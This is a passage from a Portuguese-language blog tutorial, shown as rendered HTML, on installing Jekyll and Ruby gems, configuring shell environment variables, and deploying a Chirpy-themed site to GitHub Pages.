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" width="191" height="123" class="img_ev3q">{: .center }
<em>Exemplo de arquivo html usado para defini√ß√£o de layout</em></p><ul><li>Em que, {% raw %}<code>{{ content }}</code>{% endraw %}, ser√° justamente preenchido pelo conte√∫do do arquivo <code>index.md</code>. E dessa forma nosso arquivo que antes era s√≥ texto, agora se tornou um <code>.html</code> perfeitamente formatado.</li><li>Esse arquivo novo, <code>.html</code> ser√° criado dentro de <code>_site</code> um diret√≥rio que tamb√©m ser√° criado na execu√ß√£o.</li></ul><p>Veja o esquema a seguir (clique para melhor visualiza√ß√£o):
<img loading="lazy" alt="jekylllayoutsingle" src="/assets/images/jekylllayoutsingle-04693f722e6ae70b1834093064844fab.png" width="1836" height="727" class="img_ev3q">
<em>Exemplo de como o documento de texto se torna uma p√°gina html</em></p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="gems">Gems<a href="#gems" class="hash-link" aria-label="Link direto para Gems" title="Link direto para Gems">‚Äã</a></h2><p>Gems s√£o basicamente c√≥digos, programas ou funcionalidades escritos na linguagem Ruby, que vem por meio dos pacotes Gems. Os pacotes gem podem desempenhar funcionalidades como:</p><ul><li>Convers√£o de objetos ruby para arquivo JSON;</li><li>Pagina√ß√£o;</li><li>Interagir com APIs como a do GitHub.</li></ul><p>Jekyll √© um gem, os plugins Jekyll e o tema que usaremos tamb√©m s√£o gems. </p><p>O <code>Gemfile</code> √© um arquivo que cont√©m uma lista de gems usados pelo site. </p><blockquote><p>NAO instale pacotes Ruby Gems (chamados de gems) ao longo deste tutorial, a menos que voc√™ saiba o que est√° fazendo. Acredita em mim, vai dar bigode se fizer isso. ‚ÄúSe tem placa tem hist√≥ria‚Äù - S√≥crates
{: .prompt-danger }</p></blockquote><h1>Instala√ß√£o</h1><p>Primeiro siga as instru√ß√µes de instala√ß√£o do <a href="https://jekyllrb.com/docs/installation/" target="_blank" rel="noopener noreferrer">Jekyll</a> a seguir para <strong>Linux Ubuntu</strong>:</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">apt-get</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> ruby-full build-essential zlib1g-dev</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>A documenta√ß√£o do Jekyll tamb√©m tem instru√ß√µes para cada SO, caso precise:</p><ul><li><a href="https://jekyllrb.com/docs/installation/macos/" target="_blank" rel="noopener noreferrer">macOS</a></li><li><a href="https://jekyllrb.com/docs/installation/ubuntu/" target="_blank" rel="noopener noreferrer">Ubuntu</a></li><li><a href="https://jekyllrb.com/docs/installation/other-linux/" target="_blank" rel="noopener noreferrer">Other Linux</a></li><li><a href="https://jekyllrb.com/docs/installation/windows/" target="_blank" rel="noopener noreferrer">Windows</a></li></ul><p>Configure um diret√≥rio de instala√ß√£o do gem para sua conta de usu√°rio. Os comandos a seguir adicionar√£o vari√°veis de ambiente ao seu arquivo <code>~/.bashrc</code>{: .filepath} para configurar o caminho de instala√ß√£o da gem, caso use outro shell, basta substituir o bashrc pelo arquivo que o seu shell usa.
Caso n√£o fa√ßa a m√≠nima ideia do que √© isso de bashrc consulte o <a href="#anexo-1-bashrc">anexo 1</a> que tem uma explica√ß√£o r√°pida sobre ele.
Bom, seguindo em frente:</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;# Install Ruby Gems to ~/gems&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;export GEM_HOME=&quot;$HOME/gems&quot;&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;export PATH=&quot;$HOME/gems/bin:$PATH&quot;&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ~/.bashrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">source</span><span class="token plain"> ~/.bashrc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h2 class="anchor anchorWithStickyNavbar_LWe7" id="instala√ß√£o-do-tema">Instala√ß√£o do Tema<a href="#instala√ß√£o-do-tema" class="hash-link" aria-label="Link direto para Instala√ß√£o do Tema" title="Link direto para Instala√ß√£o do Tema">‚Äã</a></h2><p>Existem diversos temas que mudam a aparencia do seu site. O que eu escolhi foi o <a href="https://chirpy.cotes.page/posts/getting-started/" target="_blank" rel="noopener noreferrer">Chirpy</a>, cuidado pois podem haver diferen√ßas caso escolha outro tema.</p><p>Existem duas formas de instalar usar o Chirpy, eu seguirei com a mais f√°cil que √© usando o <a href="https://github.com/cotes2020/chirpy-starter/" target="_blank" rel="noopener noreferrer">template</a> basta clicar em <kbd>Use this template</kbd> &gt; <kbd>Create a new repository</kbd>, e nomeie o reposit√≥rio como <code>SEU-USERNAME.github.io</code>, em que, <code>SEU-USERNAME</code> √© o seu nome de usu√°rio do github.</p><p>Agora entre no seu reposit√≥rio criado e na aba <kbd>Settings</kbd> depois clique em <kbd>Pages</kbd> e abaixo de <kbd>Build and deployment</kbd> selecione <kbd>Github Actions</kbd>. E √© por meio dessas configura√ß√µes que o nossa p√°gina ser√° implementada. </p><p>Fa√ßa o clone do seu reposit√≥rio da maneira que preferir. Dois exemplos:</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">gh repo clone SEU-USERNAME/SEU-USERNAME.github.io</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">git</span><span class="token plain"> clone https://github.com/SEU-USERNAME/SEU-USERNAME.github.io.git</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Com o reposit√≥rio, podemos seguir com a instala√ß√£o dos gems necess√°rios:</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">bundle </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>Feita a instala√ß√£o, agora √© s√≥ executar <code>bundle exec jekyll serve -l -w --port 4000</code> e acessar a p√°gina em 127.0.0.1:4000.</p><p>Para configura√ß√£o, confira o post de configura√ß√£o do jekyll (em breve).</p><h1>Anexo 1 bashrc</h1><p>O shell √© basicamente uma interface de acesso ao sistema base.
O Bash √© o interpretador de comandos de shell (o seu pode ser outro).
Use com comando <code>echo $SHELL</code> para saber qual √© o seu:</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">&gt; echo $SHELL</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">/usr/bin/zsh</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>{: file=&#x27;exemplo de output&#x27;}</p><p>O meu √© o interpretador shell √© o <code>zsh</code> .</p><p>√â bom saber tamb√©m que ao logar no Linux v√°rios arquivos sao carregados para saber suas configura√ß√µes pessoais e carrega-las, um desses arquivos √© o tal do <code>bashrc</code> ou <code>zshrc</code> , por isso temos que adicionar aquelas linhas a esses arquivos, para que carreguem as nossa prefer√™ncias e configura√ß√µes do ruby.</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;# Install Ruby Gems to ~/gems&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ~/.zshrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;export GEM_HOME=&quot;$HOME/gems&quot;&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ~/.zshrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">echo</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;export PATH=&quot;$HOME/gems/bin:$PATH&quot;&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;&gt;</span><span class="token plain"> ~/.zshrc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token builtin class-name">source</span><span class="token plain"> ~/.zshrc</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copiar c√≥digo para a √°rea de transfer√™ncia" title="Copiar" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><h1>Ref.</h1><p>CHUNG, C. Getting Started. Dispon√≠vel em: <a href="https://chirpy.cotes.page/posts/getting-started/" target="_blank" rel="noopener noreferrer">https://chirpy.cotes.page/posts/getting-started/</a>. Acesso em: 24 fev. 2023.</p><p>COSTA, M. Usando Jekyll e GitHub Pages. Dispon√≠vel em: <a href="https://murilo.tech/posts/usando-jekyll-e-github-pages/" target="_blank" rel="noopener noreferrer">https://murilo.tech/posts/usando-jekyll-e-github-pages/</a>. Acesso em: 24 fev. 2023.</p><p>DOMINGUEZ, J. How Jekyll Works ; ruhoh universal static blog generator. Dispon√≠vel em: <a href="http://jekyllbootstrap.com/lessons/jekyll-introduction.html" target="_blank" rel="noopener noreferrer">http://jekyllbootstrap.com/lessons/jekyll-introduction.html</a>. Acesso em: 24 fev. 2023.</p><p>JEKYLL TEAM. Command Line Usage. Dispon√≠vel em: <a href="https://jekyllrb.com/docs/usage/" target="_blank" rel="noopener noreferrer">https://jekyllrb.com/docs/usage/</a>. Acesso em: 24 fev. 2023.</p><p>JEKYLL TEAM. Ruby 101. Dispon√≠vel em: <a href="https://jekyllrb.com/docs/ruby-101/" target="_blank" rel="noopener noreferrer">https://jekyllrb.com/docs/ruby-101/</a>. Acesso em: 24 fev. 2023.</p><p>TOMJOHT. Convert an HTML site to Jekyll. Dispon√≠vel em: <a href="https://jekyllrb.com/tutorials/convert-site-to-jekyll/" target="_blank" rel="noopener noreferrer">https://jekyllrb.com/tutorials/convert-site-to-jekyll/</a>. Acesso em: 24 fev. 2023. </p><p>*<!-- -->[SO]<!-- -->:&quot;Sistema Operacional&quot;</p></div><footer class="row docusaurus-mt-lg"><div class="col"><b>Marcadores:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/pratica">pr√°tica</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/teoria">teoria</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/blog/tags/tutorial">tutorial</a></li></ul></div></footer></article><article class="margin-bottom--xl" itemprop="blogPost" itemscope="" itemtype="http://schema.org/BlogPosting"><header><h2 class="title_f1Hy" itemprop="headline"><a itemprop="url" href="/blog/2022/12/03/linksimb/malabarismo-com-links-simb√≥licos">Malabarismo com link simb√≥lico</a></h2><div class="container_mt6G margin-vert--md"><time datetime="2022-12-03T18:40:00.000Z" itemprop="datePublished">3 de dezembro de 2022</time> ¬∑ <!-- -->Leitura de 2 minutos</div><div class="margin-top--md margin-bottom--sm row"><div class="col col--6 authorCol_Hf19"><div class="avatar margin-bottom--sm"><a href="https://www.linkedin.com/in/gguedescruz/" target="_blank" rel="noopener noreferrer" class="avatar__photo-link"><img class="avatar__photo" src="https://avatars.githubusercontent.com/u/52048434?v=4" alt="Godes"></a><div class="avatar__intro" itemprop="author" itemscope="" itemtype="https://schema.org/Person"><div class="avatar__name"><a href="https://www.linkedin.com/in/gguedescruz/" 